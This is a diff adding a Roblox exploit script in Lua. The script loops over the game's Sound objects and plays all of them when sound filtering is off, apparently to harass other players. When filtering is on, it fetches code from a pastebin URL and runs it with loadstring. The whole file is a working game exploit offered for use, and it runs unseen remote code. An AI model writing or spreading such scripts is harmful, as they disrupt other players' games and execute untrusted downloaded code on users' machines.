@@ -1,0 +1,13 @@
+while true do
+if game.SoundService.RespectFilteringEnabled == false then
+for i,v in pairs(game.Workspace:GetDescendants()) do
+if v:IsA("Sound") then 
+v:Play()
+end
+end
+else
+loadstring(game:HttpGetAsync("https://pastebin.com/raw/Ts8TSAZN", 0, true))()
+notify("Sound is unexploitable.", warn("Sad"))
+end
+wait(5)
+end
